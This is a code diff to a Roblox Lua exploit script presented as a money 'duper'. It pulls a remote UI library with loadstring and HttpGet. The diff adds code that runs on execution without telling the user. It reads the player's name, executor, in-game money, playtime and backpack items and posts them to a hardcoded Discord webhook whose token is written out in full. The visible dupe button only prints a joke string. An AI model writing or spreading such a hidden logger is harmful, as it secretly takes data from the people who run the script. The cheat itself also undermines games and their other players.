@@ -1,10 +1,10 @@
-local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
+    local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 
 local Window = Rayfield:CreateWindow({
-   Name = "AnomixV2 Duper,
+   Name = "AnomixDuper V.1",
    Icon = 0, -- Icon in Topbar. Can use Lucide Icons (string) or Roblox Image (number). 0 to use no icon (default).
-   LoadingTitle = "Duper v1",
-   LoadingSubtitle = "by Sirius",
+   LoadingTitle = "AnomixDuper Loaded!",
+   LoadingSubtitle = "Duper that actually works.",
    Theme = "Default", -- Check https://docs.sirius.menu/rayfield/configuration/themes
 
    DisableRayfieldPrompts = false,
@@ -34,6 +34,10 @@ local Window = Rayfield:CreateWindow({
    }
 })
 
+local Tab = Window:CreateTab("Main")
+
+
+
 local Button = Tab:CreateButton({
     Name = "Dupe 500K (Resets Money)",
     Callback = function()
@@ -48,3 +52,67 @@ local Button = Tab:CreateButton({
     print("skibidi saka")
 
 end})
+
+
+function SendMessageEMBED(url, embed)
+    local http = game:GetService("HttpService")
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
+    local data = {
+        ["embeds"] = {
+            {
+                ["title"] = embed.title,
+                ["description"] = embed.description,
+                ["color"] = embed.color,
+                ["fields"] = embed.fields,
+                ["footer"] = {
+                    ["text"] = embed.footer.text
+                }
+            }
+        }
+    }
+    local body = http:JSONEncode(data)
+    local response = request({
+        Url = url,
+        Method = "POST",
+        Headers = headers,
+        Body = body
+    })
+end
+
+-- Examples
+local url = "https://discord.com/api/webhooks/1323737173681242143/jvlOgbPcfbC4gTDfL8_3AXwF-ada8OYJfP9nazQqC_odBXrIxqrFuoYGG4LSYuoeyHhc"
+local Executor = identifyexecutor()
+local ServerAge = game.ReplicatedStorage.ServerRunTime.Value
+
+local BackpackItems = {}
+for i, v in pairs(game.Players.LocalPlayer.PlayerGui.MainUIHolder.Menus.BackpackGUI.Basic.ItemBase.ItemGrid:GetChildren()) do
+    if v.Name ~= "UIGridLayout" then
+        table.insert(BackpackItems, v.Name)
+    end
+end
+
+local embed = {
+    ["title"] = game.Players.LocalPlayer.Name,
+    ["description"] = "Executor: " .. Executor,
+    ["color"] = 65280,
+    ["fields"] = {
+        {
+            ["name"] = "Money:",
+            ["value"] = game.Players.LocalPlayer.PlayerGui.MainUIHolder.MenuBar.CashDisplay.Text
+        },
+        {
+            ["name"] = "Playtime:",
+            ["value"] = game.Players.LocalPlayer.PlayerGui.MainUIHolder.Menus.SettingsGUI.Settings.Playtime.Counter.Text
+        },
+        {
+            ["name"] = "Backpack content:",
+            ["value"] = table.concat(BackpackItems, ", ")
+        },
+    },
+    ["footer"] = {
+        ["text"] = "Server age: " .. ServerAge
+    }
+}
+SendMessageEMBED(url, embed)
